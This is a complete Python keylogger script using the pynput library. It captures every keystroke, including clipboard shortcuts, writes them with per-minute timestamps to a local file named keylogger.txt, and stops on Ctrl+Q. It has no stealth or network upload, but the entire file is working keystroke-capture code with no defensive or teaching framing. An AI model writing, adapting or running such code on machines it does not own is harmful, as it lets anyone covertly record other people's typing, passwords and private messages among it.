from pynput.keyboard import Listener, Key, KeyCode
from pynput import keyboard
import datetime
import time
import threading


pressed_keys = set()
def keylogger(key):
 pressed_keys.add(key)
 if Key.ctrl_l in pressed_keys and key == KeyCode.from_char('q'):
   print("Ctrl + Q press - stop listener")
   return False
 key = str(key).replace("'", "")
 special_keys = {
   'Key.space': ' ',
   'Key.enter': '\n',
   'Key.up': '',
   'Key.right': ' ',
   'Key.left': '',
   'Key.down': '\n',
   'Key.ctrl_l': '<ctrl >',
   '\\x03': '<copy >',
   'Key.backspace': '',
   '\\x18': '<cut >',
   '\\x16': '<paste >'
 }
 key = special_keys.get(key, key)
 if not key.isalpha() or key.isnumeric():
   key = ' {0} '.format(key)


 with open('keylogger.txt', 'a') as file:
   file.write(key)
def time_print():
 while True:
   now = datetime.datetime.now()
   with open('keylogger.txt', 'a') as file:
     file.write("***"+now.strftime("%Y-%m-%d %H:%M:%S"+"***"+'\n'))
   time.sleep(60)


def on_press(key):
 pressed_keys.add(key)
 keylogger(key)
 if (Key.ctrl_l in pressed_keys or Key.ctrl_r in pressed_keys) and \
         (key == KeyCode.from_char('q') or KeyCode.from_char('q') in pressed_keys):
   print("Ctrl + Q press - stop listener")
   return False


def on_release(key):
 if key in pressed_keys:
   pressed_keys.remove(key)
play=threading.Thread(target=time_print, daemon=True)
play.start()


with Listener(on_press=on_press,on_release=on_release) as listener:
 listener.join()


